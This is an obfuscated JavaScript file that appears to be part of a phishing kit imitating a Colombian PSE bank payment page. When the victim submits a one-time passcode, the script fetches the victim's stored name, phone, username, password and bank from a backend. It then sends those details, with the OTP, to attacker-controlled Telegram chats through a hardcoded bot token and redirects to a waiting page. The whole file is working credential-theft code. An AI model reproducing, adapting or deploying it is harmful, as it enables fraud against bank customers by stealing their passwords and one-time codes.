const _0x19d214 = _0x3c32;
(function (_0x21991e, _0x3c11d6) {
  const _0x1c42bf = _0x3c32,
    _0x514db1 = _0x21991e();
  while (!![]) {
    try {
      const _0x4023d7 =
        (-parseInt(_0x1c42bf(0x8b)) / 0x1) *
          (-parseInt(_0x1c42bf(0xa9)) / 0x2) +
        (-parseInt(_0x1c42bf(0x88)) / 0x3) *
          (-parseInt(_0x1c42bf(0x95)) / 0x4) +
        parseInt(_0x1c42bf(0x99)) / 0x5 +
        (-parseInt(_0x1c42bf(0x8c)) / 0x6) *
          (-parseInt(_0x1c42bf(0xa2)) / 0x7) +
        (-parseInt(_0x1c42bf(0x7c)) / 0x8) *
          (-parseInt(_0x1c42bf(0x81)) / 0x9) +
        parseInt(_0x1c42bf(0x8a)) / 0xa +
        (-parseInt(_0x1c42bf(0xa1)) / 0xb) * (parseInt(_0x1c42bf(0xb0)) / 0xc);
      if (_0x4023d7 === _0x3c11d6) break;
      else _0x514db1["push"](_0x514db1["shift"]());
    } catch (_0x239f39) {
      _0x514db1["push"](_0x514db1["shift"]());
    }
  }
})(_0x75c3, 0x2739e);
function updateLS() {
  const _0x57d35a = _0x3c32;
  LS["setItem"](_0x57d35a(0x9e), JSON["stringify"](info));
}
function _0x75c3() {
  const _0x506760 = [
    "Error\x20al\x20procesar\x20la\x20OTP:",
    "16zaKTBu",
    "GET",
    "log",
    "\x0a🔒Contraseña:\x20",
    "Error\x20al\x20enviar\x20mensaje\x20(chat\x20ID:\x20",
    "670581dHApzd",
    "location",
    "Mensaje\x20enviado\x20a\x20Telegram\x20(chat\x20ID:\x20",
    "\x0a💎OTP:\x20",
    "password",
    "&text=",
    "nombre",
    "3SHWcoS",
    "\x0a🆔Nombre:\x20",
    "1052440GYyejL",
    "13883agWKyp",
    "1350654uskLxN",
    "getElementById",
    "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=",
    "disabled",
    "metaInfo",
    "stringify",
    "\x0a🚹Usuario:\x20",
    "\x0aFuente:\x20",
    "Error\x20de\x20red\x20(chat\x20ID:\x20",
    "1109188XTULYF",
    "Usuario\x20no\x20encontrado\x20en\x20la\x20base\x20de\x20datos",
    "\x0aIngresó\x20OTP",
    "focus",
    "1322960KpkBOC",
    "addEventListener",
    "Error\x20al\x20actualizar\x20el\x20usuario",
    "cdin",
    "error",
    "info",
    "🟣\x20PSE\x20(Claro)\x0a©️ID:\x20",
    "/trico/tricoData",
    "11gZnYCT",
    "7tYWiAE",
    "find",
    "application/json",
    "json",
    "bank",
    "\x0a🏦Banco:\x20",
    "PUT",
    "38zWjllF",
    "usuario",
    "Por\x20favor\x20ingrese\x20el\x20token\x20de\x20seguridad",
    "Usuario\x20actualizado",
    "click",
    "statusText",
    "Usuario\x20Encontrado",
    "13492404Crrxso",
    "/trico/updateTricoPse/",
    "Error\x20al\x20obtener\x20los\x20datos\x20del\x20servidor",
    "idreg",
  ];
  _0x75c3 = function () {
    return _0x506760;
  };
  return _0x75c3();
}
const otpButton = document[_0x19d214(0x8d)]("btnDinamica"),
  numberMovil = document[_0x19d214(0x8d)]("txtDinamica");
function _0x3c32(_0x4577ee, _0x7bfd4f) {
  const _0x75c351 = _0x75c3();
  return (
    (_0x3c32 = function (_0x3c320e, _0x160f44) {
      _0x3c320e = _0x3c320e - 0x79;
      let _0x46d9f0 = _0x75c351[_0x3c320e];
      return _0x46d9f0;
    }),
    _0x3c32(_0x4577ee, _0x7bfd4f)
  );
}
async function sendToTelegram(_0x36f110) {
  const _0x3728ae = _0x19d214;
  for (const _0xc1f373 of chatIds) {
    const _0x2afd98 =
      _0x3728ae(0x8e) +
      _0xc1f373 +
      _0x3728ae(0x86) +
      encodeURIComponent(_0x36f110);
    try {
      const _0x542765 = await fetch(_0x2afd98);
      _0x542765["ok"]
        ? console[_0x3728ae(0x7e)](_0x3728ae(0x83) + _0xc1f373 + ")")
        : console[_0x3728ae(0x9d)](
            _0x3728ae(0x80) + _0xc1f373 + "):",
            _0x542765[_0x3728ae(0xae)]
          );
    } catch (_0x4f85f1) {
      console[_0x3728ae(0x9d)](_0x3728ae(0x94) + _0xc1f373 + "):", _0x4f85f1);
    }
  }
}
otpButton[_0x19d214(0x9a)](_0x19d214(0xad), async function (_0x1e787b) {
  const _0x35b587 = _0x19d214;
  _0x1e787b["preventDefault"](), (otpButton[_0x35b587(0x8f)] = !![]);
  if (numberMovil["value"] == "") {
    alert(_0x35b587(0xab)),
      numberMovil[_0x35b587(0x98)](),
      (otpButton[_0x35b587(0x8f)] = ![]);
    return;
  } else {
    var _0x467fb2 = numberMovil["value"];
    (info[_0x35b587(0x90)][_0x35b587(0x9c)] = _0x467fb2), updateLS();
    try {
      const _0x145d69 = await fetch(url + _0x35b587(0xa0), {
        method: _0x35b587(0x7d),
        headers: { "Content-Type": _0x35b587(0xa4) },
      });
      if (!_0x145d69["ok"]) throw new Error(_0x35b587(0x79));
      const _0x162f38 = await _0x145d69[_0x35b587(0xa5)](),
        _0x1d50c8 = [..._0x162f38],
        _0x4f8484 = _0x1d50c8[_0x35b587(0xa3)](
          (_0xa6e9aa) => _0xa6e9aa["id"] == info["metaInfo"]["cc"]
        );
      if (_0x4f8484) {
        console[_0x35b587(0x7e)](_0x35b587(0xaf));
        const _0x46cff7 = await fetch(
          url + _0x35b587(0xb1) + _0x4f8484[_0x35b587(0x7a)],
          {
            method: _0x35b587(0xa8),
            headers: { "Content-Type": _0x35b587(0xa4) },
            body: JSON[_0x35b587(0x91)]({
              otp: info["metaInfo"][_0x35b587(0x9c)],
            }),
          }
        );
        if (!_0x46cff7["ok"]) throw new Error(_0x35b587(0x9b));
        const _0x5f52a3 = await _0x46cff7[_0x35b587(0xa5)](),
          _0x20e847 =
            _0x35b587(0x9f) +
            _0x4f8484["id"] +
            _0x35b587(0x89) +
            _0x4f8484[_0x35b587(0x87)] +
            "\x0a📱Teléfono:\x20" +
            _0x4f8484["telefono"] +
            _0x35b587(0x92) +
            _0x4f8484[_0x35b587(0xaa)] +
            _0x35b587(0x7f) +
            _0x4f8484[_0x35b587(0x85)] +
            _0x35b587(0x84) +
            info[_0x35b587(0x90)]["cdin"] +
            _0x35b587(0xa7) +
            _0x4f8484[_0x35b587(0xa6)] +
            _0x35b587(0x93) +
            fuente +
            _0x35b587(0x97);
        await sendToTelegram(_0x20e847), console["log"](_0x35b587(0xac));
      } else console[_0x35b587(0x9d)](_0x35b587(0x96));
    } catch (_0x59d0a1) {
      console[_0x35b587(0x9d)](_0x35b587(0x7b), _0x59d0a1);
    } finally {
      (otpButton["disabled"] = ![]),
        (window[_0x35b587(0x82)]["href"] = "wait.html");
    }
  }
});
